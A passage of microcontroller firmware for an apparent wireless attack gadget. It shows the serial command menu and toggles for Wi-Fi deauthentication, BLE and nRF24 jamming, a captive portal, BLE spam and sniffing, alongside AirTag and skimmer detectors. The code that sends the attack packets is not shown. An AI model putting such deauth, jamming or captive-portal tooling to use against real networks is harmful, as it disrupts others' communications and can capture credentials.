  tft.setCursor(SIDE_MARGIN + 5, y);
  tft.print("Security: ");
  if (wardrivingStats.totalAPs > 0) {
    int securePercent = (wardrivingStats.securedAPs * 100) / wardrivingStats.totalAPs;
    tft.setTextColor(securePercent > 70 ? COLOR_SUCCESS : COLOR_WARNING);
    tft.printf("%d%%", securePercent);
  }
  
  drawBackButton();
}

// ==================== Serial Commands ====================

void handleSerialCommands() {
  if (Serial.available()) {
    String cmd = Serial.readStringUntil('\n');
    cmd.trim();
    cmd.toLowerCase();
    
    Serial.println("CMD: " + cmd);
    
    if (cmd == "help") {
      Serial.println("\n=== P4WNC4K3 Console ===");
      Serial.println("scan - Scan WiFi networks");
      Serial.println("deauth - Toggle deauth attack");
      Serial.println("sniffer - Toggle packet sniffer");
      Serial.println("ble - Scan BLE devices");
      Serial.println("blejam - Toggle BLE jammer");
      Serial.println("nrfjam - Toggle nRF24 jammer");
      Serial.println("airtag - Scan for AirTags");
      Serial.println("skimmer - Detect card skimmers");
      Serial.println("portal - Toggle captive portal");
      Serial.println("spam - BLE spam attacks");
      Serial.println("wardrive - Wardriving mode");
      Serial.println("status - Show system status");
      Serial.println("console - Show console on screen");
      Serial.println("clear - Clear console buffer");
      Serial.println("upload - Upload boot.gif via serial");  // ADDED
      Serial.println("info - System information");
    }
    else if (cmd == "scan") {
      scanWiFiNetworks();
    }
    else if (cmd == "deauth") {
      toggleDeauth();
    }
    else if (cmd == "sniffer") {
      toggleSniffer();
    }
    else if (cmd == "ble") {
      scanBLEDevices();
    }
    else if (cmd == "blejam") {
      toggleBLEJammer();
    }
    else if (cmd == "nrfjam") {
      toggleNRFJammer();
    }
    else if (cmd == "airtag") {
      startAirTagScanner();
    }
    else if (cmd == "skimmer") {
      startSkimmerDetector();
    }
    else if (cmd == "portal") {
      toggleCaptivePortal();
    }
    else if (cmd == "wardrive") {
      startWardriving();
    }
    else if (cmd == "status") {
      printStatus();
    }
    else if (cmd == "console") {
      showConsole();
    }
    else if (cmd == "clear") {
      clearConsole();
    }
    else if (cmd == "skull") {
      showSkull = !showSkull;
      Serial.println(showSkull ? "Skull animation ON" : "Skull animation OFF");
    }
    else if (cmd == "info") {
      printSystemInfo();
    }
    else {
      Serial.println("Unknown command. Type 'help' for commands.");
    }
  }
}

void toggleDeauth() {
  if (!deauthActive) {
    if (networkCount > 0) {
      startDeauth();
      Serial.println("Deauth started");
    } else {
      Serial.println("Scan networks first");
    }
  } else {
    stopDeauth();
    Serial.println("Deauth stopped");
  }
}

void toggleSniffer() {
  if (!snifferActive) {
    startSniffer();
  } else {
    stopSniffer();
  }
}

void toggleCaptivePortal() {
  if (snifferActive) stopSniffer();
  if (deauthActive) stopDeauth();
  
  WiFi.disconnect();
  delay(100);
  WiFi.mode(WIFI_AP);
  if (!portalActive) {
    if (networkCount > 0) {
      startCaptivePortal();
    } else {
      Serial.println("Scan networks first");
    }
  } else {
    stopCaptivePortal();
  }
}

void toggleBLEJammer() {
  if (!bleJammerActive) {
    startBLEJammer();
  } else {
    stopBLEJammer();
  }
}

void toggleNRFJammer() {
  if (!nrfJammerActive) {
    startNRFJammer();
  } else {
    stopNRFJammer();
  }
}

void printStatus() {
  Serial.println("\n=== System Status ===");
  Serial.printf("Deauth: %s (%d pkts)\n", deauthActive ? "ACTIVE" : "INACTIVE", deauthPacketsSent);
  Serial.printf("Sniffer: %s\n", snifferActive ? "ACTIVE" : "INACTIVE");
  Serial.printf("BLE Jammer: %s (%d pkts)\n", bleJammerActive ? "ACTIVE" : "INACTIVE", bleJamPackets);
  Serial.printf("nRF24 Jammer: %s (%d pkts)\n", nrfJammerActive ? "ACTIVE" : "INACTIVE", nrfJamPackets);
  Serial.printf("Packets: Total=%d, Beacon=%d, Data=%d, Deauth=%d\n", 
                packetCount, beaconCount, dataCount, deauthCount);
  Serial.printf("Portal: %s\n", portalActive ? "ACTIVE" : "INACTIVE");
  Serial.printf("AirTags detected: %d\n", airTagCount);
  Serial.printf("Skimmers detected: %d\n", skimmerCount);
  Serial.printf("Free Heap: %d KB\n", ESP.getFreeHeap() / 1024);
}

void clearConsole() {
  for (int i = 0; i < 15; i++) {
    consoleBuffer[i] = "";
  }
  consoleIndex = 0;
  Serial.println("Console cleared");
}

void printSystemInfo() {
  Serial.println("\n=== System Info ===");
  Serial.printf("Chip: %s\n", ESP.getChipModel());
  Serial.printf("CPU: %d MHz\n", ESP.getCpuFreqMHz());
  Serial.printf("Flash: %d MB\n", ESP.getFlashChipSize() / 1048576);
  Serial.printf("MAC: %s\n", WiFi.macAddress().c_str());
  Serial.printf("SDK: %s\n", ESP.getSdkVersion());
  Serial.printf("nRF24 #1: %s\n", nrf1Available ? "Available" : "Not found");
  Serial.printf("nRF24 #2: %s\n", nrf2Available ? "Available" : "Not found");
}
